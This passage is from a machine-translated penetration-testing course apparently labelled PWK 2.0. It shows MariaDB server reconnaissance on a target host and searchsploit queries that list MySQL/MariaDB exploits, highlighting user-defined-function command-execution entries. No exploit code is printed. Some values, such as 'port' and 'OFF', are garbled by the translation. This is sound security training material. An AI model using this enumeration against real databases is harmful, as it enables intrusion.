<div style="position:absolute;top:195204;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">aria_checkpoint_interval    </font></font></nobr></div>
<div style="position:absolute;top:195204;left:457"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">30    </font></font></nobr></div>
<div style="position:absolute;top:195204;left:773"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">|</font></font></nobr></div>
<div style="position:absolute;top:195220;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:195237;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">主机名    </font></font></b></nobr></div>
<div style="position:absolute;top:195237;left:457"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">佐拉    </font></font></b></nobr></div>
<div style="position:absolute;top:195237;left:773"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">|</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:195254;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">身份    </font></font></nobr></div>
<div style="position:absolute;top:195254;left:457"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">0    </font></font></nobr></div>
<div style="position:absolute;top:195254;left:773"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">|</font></font></nobr></div>
<div style="position:absolute;top:195271;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:195288;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">pid_file    </font></font></nobr></div>
<div style="position:absolute;top:195288;left:457"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">/run/mysqld/mariadb.pid    </font></font></nobr></div>
<div style="position:absolute;top:195288;left:773"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">|</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:195305;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">插件目录    </font></font></b></nobr></div>
<div style="position:absolute;top:195305;left:457"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">/家/开发/插件/    </font></font></b></nobr></div>
<div style="position:absolute;top:195305;left:773"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">|</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:195322;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">plugin_maturity    </font></font></nobr></div>
<div style="position:absolute;top:195322;left:457"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">伽玛    </font></font></nobr></div>
<div style="position:absolute;top:195322;left:773"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">|</font></font></nobr></div>
<div style="position:absolute;top:195339;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">港口    </font></font></nobr></div>
<div style="position:absolute;top:195339;left:457"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">3306    </font></font></nobr></div>
<div style="position:absolute;top:195339;left:773"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">|</font></font></nobr></div>
<div style="position:absolute;top:195356;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">preload_buffer_size    </font></font></nobr></div>
<div style="position:absolute;top:195356;left:457"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">32768    </font></font></nobr></div>
<div style="position:absolute;top:195356;left:773"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">|</font></font></nobr></div>
<div style="position:absolute;top:195373;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">剖析    </font></font></nobr></div>
<div style="position:absolute;top:195373;left:457"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">离开    </font></font></nobr></div>
<div style="position:absolute;top:195373;left:773"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">|</font></font></nobr></div>
<div style="position:absolute;top:195390;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:195407;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">tmp_memory_table_size    </font></font></nobr></div>
<div style="position:absolute;top:195407;left:457"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">16777216    </font></font></nobr></div>
<div style="position:absolute;top:195407;left:773"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">|</font></font></nobr></div>
<div style="position:absolute;top:195424;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">tmp_table_size    </font></font></nobr></div>
<div style="position:absolute;top:195424;left:457"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">16777216    </font></font></nobr></div>
<div style="position:absolute;top:195424;left:773"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">|</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:195441;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">目录    </font></font></b></nobr></div>
<div style="position:absolute;top:195441;left:457"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">/var/tmp    </font></font></b></nobr></div>
<div style="position:absolute;top:195441;left:773"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">|</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:195458;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">transaction_alloc_block_size    </font></font></nobr></div>
<div style="position:absolute;top:195458;left:457"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">8192    </font></font></nobr></div>
<div style="position:absolute;top:195458;left:773"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">|</font></font></nobr></div>
<div style="position:absolute;top:195475;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:195492;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">用户状态    </font></font></nobr></div>
<div style="position:absolute;top:195492;left:457"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">离开    </font></font></nobr></div>
<div style="position:absolute;top:195492;left:773"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">|</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:195509;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">版本    </font></font></b></nobr></div>
<div style="position:absolute;top:195509;left:457"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">10.3.20-MariaDB    </font></font></b></nobr></div>
<div style="position:absolute;top:195509;left:773"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">|</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:195526;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">version_comment    </font></font></nobr></div>
<div style="position:absolute;top:195526;left:457"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">MariaDB 服务器    </font></font></nobr></div>
<div style="position:absolute;top:195526;left:773"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">|</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:195543;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">version_compile_machine    </font></font></b></nobr></div>
<div style="position:absolute;top:195543;left:457"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">x86_64    </font></font></b></nobr></div>
<div style="position:absolute;top:195543;left:773"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">|</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:195560;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">version_compile_os    </font></font></nobr></div>
<div style="position:absolute;top:195560;left:457"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">Linux    </font></font></nobr></div>
<div style="position:absolute;top:195560;left:773"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">|</font></font></nobr></div>
<div style="position:absolute;top:195577;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">version_malloc_library    </font></font></nobr></div>
<div style="position:absolute;top:195577;left:457"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">系统    </font></font></nobr></div>
<div style="position:absolute;top:195577;left:773"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">|</font></font></nobr></div>
<div style="position:absolute;top:195594;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:195611;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">wsrep_sst_receive_address    </font></font></nobr></div>
<div style="position:absolute;top:195611;left:457"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">汽车    </font></font></nobr></div>
<div style="position:absolute;top:195611;left:773"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">|</font></font></nobr></div>
<div style="position:absolute;top:195628;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">wsrep_start_position    </font></font></nobr></div>
<div style="position:absolute;top:195628;left:457"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">00000000-0000-0000-0000-000000000000：|</font></font></nobr></div>
<div style="position:absolute;top:195645;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">wsrep_sync_wait    </font></font></nobr></div>
<div style="position:absolute;top:195645;left:457"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">0    </font></font></nobr></div>
<div style="position:absolute;top:195645;left:773"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">|</font></font></nobr></div>
<div style="position:absolute;top:195661;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">+-----------------------------------------+------ --------------------------------+</font></font></nobr></div>
<div style="position:absolute;top:195678;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">639 行（0.154 秒）</font></font></nobr></div>
<div style="position:absolute;top:195698;left:362"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 903 - 显示所有变量</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:195727;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">从这个查询中我们学到了一些东西。</font><font style="vertical-align: inherit;">首先，我们发现主机名是“zora”。</font><font style="vertical-align: inherit;">由此</font></font></nobr></div>
<div style="position:absolute;top:195747;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">重点是，我们将 MariaDB 主机称为 Zora。</font><font style="vertical-align: inherit;">接下来我们也了解到tmp目录是</font></font></nobr></div>
<div style="position:absolute;top:195766;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在 /var/tmp. </font><font style="vertical-align: inherit;">我们还再次确认我们正在运行 MariaDB 版本 10.3.20 但我们现在也</font></font></nobr></div>
<div style="position:absolute;top:195785;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">了解到目标架构是</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">x86_64</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">我们可以收集到的最有趣的信息</font></font></nobr></div>
<div style="position:absolute;top:195805;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">是</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">plugin_dir</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">设置为 /home/dev/plugin/。</font><font style="vertical-align: inherit;">此目录不是 MariaDB 的标准目录。</font><font style="vertical-align: inherit;">让我们</font></font></nobr></div>
<div style="position:absolute;top:195824;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">请注意这一点，因为它可能在以后变得有用。</font></font></nobr></div>
<div style="position:absolute;top:195857;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">现在我们已经收集了一些信息，让我们看看是否可以为我们的目标找到任何漏洞利用</font></font></nobr></div>
<div style="position:absolute;top:195876;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">MariaDB 版本。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:195911;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">searchsploit mariadb</font></font></font></b></nobr></div>
<div style="position:absolute;top:195928;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-------------------------------------------------- ---- -------------------------------</font></font></nobr></div>
<div style="position:absolute;top:195945;left:117"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">漏洞利用标题    </font></font></nobr></div>
<div style="position:absolute;top:195945;left:546"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">路径（/usr/share/exploitdb/）</font></font></nobr></div>
<div style="position:absolute;top:195962;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-------------------------------------------------- ---- -------------------------------</font></font></nobr></div>
<div style="position:absolute;top:195979;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">MariaDB 客户端 10.1.26 - 拒绝服务 (PoC) | </font><font style="vertical-align: inherit;">漏洞利用/linux/dos/45901.txt</font></font></nobr></div>
<div style="position:absolute;top:195996;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">MySQL / MariaDB - 几何查询拒绝服务 | </font><font style="vertical-align: inherit;">漏洞利用/linux/dos/38392.txt</font></font></nobr></div>
<div style="position:absolute;top:196013;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">MySQL / MariaDB / PerconaDB 5.5.51/5.6.32/5.7.14 - Co | </font><font style="vertical-align: inherit;">漏洞利用/linux/local/40360.txt</font></font></nobr></div>
<div style="position:absolute;top:196030;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">MySQL / MariaDB / PerconaDB 5.5.x/5.6.x/5.7.x - 'mysq | </font><font style="vertical-align: inherit;">漏洞利用/linux/local/40678.c</font></font></nobr></div>
<div style="position:absolute;top:196047;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">MySQL / MariaDB / PerconaDB 5.5.x/5.6.x/5.7.x - 'root | </font><font style="vertical-align: inherit;">漏洞利用/linux/local/40679.sh</font></font></nobr></div>
<div style="position:absolute;top:196064;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Oracle MySQL / MariaDB - 不安全的 Salt Generation Sec | </font><font style="vertical-align: inherit;">漏洞利用/linux/remote/38109.pl</font></font></nobr></div>
</span></font>

<div style="position:absolute;top:196195;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="166"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 166 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:196228;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:197305;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:197305;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:197305;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">783</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:196324;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-------------------------------------------------- ---------------------------</font></font></nobr></div>
<div style="position:absolute;top:196340;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Shellcodes：没有结果</font></font></nobr></div>
<div style="position:absolute;top:196357;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">论文：没有结果</font></font></nobr></div>
<div style="position:absolute;top:196377;left:350"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 904 - 用于 MariaDB 的 SearchSploit</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:196406;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">不幸的是，这些都不适用于我们的 MariaDB 版本。</font><font style="vertical-align: inherit;">让我们扩大范围和</font></font></nobr></div>
<div style="position:absolute;top:196426;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">看看我们从 MySQL 中得到了什么。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:196460;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">searchsploit mysql</font></font></font></b></nobr></div>
<div style="position:absolute;top:196477;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-------------------------------------------------- -- ----------------------------------</font></font></nobr></div>
<div style="position:absolute;top:196495;left:117"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">漏洞利用标题    </font></font></nobr></div>
<div style="position:absolute;top:196495;left:530"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">路径（/usr/share/exploitdb/）</font></font></nobr></div>
<div style="position:absolute;top:196511;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-------------------------------------------------- -- ----------------------------------</font></font></nobr></div>
<div style="position:absolute;top:196528;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:196545;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">MySQL (Linux) - 数据库提权 | </font><font style="vertical-align: inherit;">漏洞利用/linux/local/23077.pl</font></font></nobr></div>
<div style="position:absolute;top:196562;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">MySQL (Linux) - 堆溢出 (PoC)    </font></font></nobr></div>
<div style="position:absolute;top:196562;left:530"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">漏洞利用/linux/dos/23076.pl</font></font></nobr></div>
<div style="position:absolute;top:196579;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">MySQL (Linux) - 堆栈缓冲区溢出 (PoC)    </font></font></nobr></div>
<div style="position:absolute;top:196579;left:530"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">漏洞利用/linux/dos/23075.pl</font></font></nobr></div>
<div style="position:absolute;top:196596;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:196613;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">MySQL 3.x/4.x - ALTER TABLE/RENAME 强制旧 Permi | </font><font style="vertical-align: inherit;">漏洞利用/linux/remote/24669.txt</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:196630;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">MySQL 4.0.17 (Linux) - 用户定义函数 (U |exploits/linux/local/1181.c</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:196647;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">MySQL 4.1.18/5.0.20 - 本地/远程信息泄漏 | </font><font style="vertical-align: inherit;">漏洞利用/linux/remote/1742.c</font></font></nobr></div>
<div style="position:absolute;top:196664;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">MySQL 4.1/5.0 - 身份验证绕过    </font></font></nobr></div>
<div style="position:absolute;top:196664;left:530"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">漏洞利用/多重/远程/24250.p</font></font></nobr></div>
<div style="position:absolute;top:196681;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">升</font></font></nobr></div>
<div style="position:absolute;top:196698;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">MySQL 4.1/5.0 - 零长度密码认证 | </font><font style="vertical-align: inherit;">漏洞利用/多/远程/ 311.pl</font></font></nobr></div>
<div style="position:absolute;top:196715;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">MySQL 4.x - CREATE FUNCTION 任意 libc 代码 Exe | </font><font style="vertical-align: inherit;">漏洞利用/多重/远程/25209.p</font></font></nobr></div>
<div style="position:absolute;top:196732;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">升</font></font></nobr></div>
<div style="position:absolute;top:196749;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">MySQL 4.x - CREATE FUNCTION mysql.func Table Arbitr | </font><font style="vertical-align: inherit;">漏洞利用/多重/远程/25210.p</font></font></nobr></div>
<div style="position:absolute;top:196766;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">生命值</font></font></nobr></div>
<div style="position:absolute;top:196783;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">MySQL 4.x - CREATE Temporary TABLE Symlink Privileg | </font><font style="vertical-align: inherit;">漏洞利用/多/远程/ 25211.c</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:196800;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">MySQL 4.x/5.0 (Linux) - 用户定义函数 (UDF) | </font><font style="vertical-align: inherit;">漏洞利用/linux/local/1518.c</font></font></b></nobr></div>
<div style="position:absolute;top:196817;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">MySQL 4.x/5.0 (Windows) - 用户定义函数Com | </font><font style="vertical-align: inherit;">漏洞利用/windows/remote/3274.txt</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:196834;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">MySQL 4.x/5.x - 服务器日期格式拒绝服务 | </font><font style="vertical-align: inherit;">漏洞利用/linux/dos/28234.txt</font></font></nobr></div>
<div style="position:absolute;top:196851;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">MySQL 4/5 - SUID 例行错误计算任意 D | </font><font style="vertical-align: inherit;">漏洞利用/linux/remote/28398.txt</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:196868;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">MySQL 4/5/6 - 用于命令执行的 UDF    </font></font></b></nobr></div>
<div style="position:absolute;top:196868;left:530"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">漏洞利用/linux/local/7856.txt</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:196885;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">MySQL 5 - 命令行客户端 HTML 特殊字符 | </font><font style="vertical-align: inherit;">漏洞利用/linux/remote/32445.txt</font></font></nobr></div>
<div style="position:absolute;top:196902;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">MySQL 5.0.18 - 查询日志绕过    </font></font></nobr></div>
<div style="position:absolute;top:196902;left:530"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">漏洞利用/linux/remote/27326.txt</font></font></nobr></div>
<div style="position:absolute;top:196919;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:196936;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">MySQL Squid 访问报告 2.1.4 - HTML 注入 | </font><font style="vertical-align: inherit;">漏洞利用/php/webapps/20055.txt</font></font></nobr></div>
<div style="position:absolute;top:196952;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">MySQL Squid 访问报告 2.1.4 - SQL 注入/C | </font><font style="vertical-align: inherit;">漏洞利用/php/webapps/44483.txt</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:196969;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">MySQL 用户定义 (Linux) (x32/x86_64) - 'sys_ | </font><font style="vertical-align: inherit;">漏洞利用/linux/local/46249.py</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:196987;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">MySQL yaSSL (Linux) - SSL Hello Message Buffer Over | </font><font style="vertical-align: inherit;">漏洞利用/linux/remote/16849.rb</font></font></nobr></div>
<div style="position:absolute;top:197004;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">MySQL yaSSL (Windows) - SSL Hello 消息缓冲区 Ov | </font><font style="vertical-align: inherit;">漏洞利用/windows/remote/16701.rb</font></font></nobr></div>
<div style="position:absolute;top:197020;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:197037;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">------------------------------ -------------- ---------------------</font></font></nobr></div>
<div style="position:absolute;top:197054;left:117"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">论文题目    </font></font></nobr></div>
<div style="position:absolute;top:197054;left:417"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">路径（/usr/share/exploitdb-papers</font></font></nobr></div>
<div style="position:absolute;top:197071;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">------------------------------ -------------- ---------------------</font></font></nobr></div>
<div style="position:absolute;top:197088;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:197105;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">基于 RFI 的 MySQL 会话劫持 | </font><font style="vertical-align: inherit;">docs/english/13708-mysql-session-hijacking-ove</font></font></nobr></div>
</span></font>
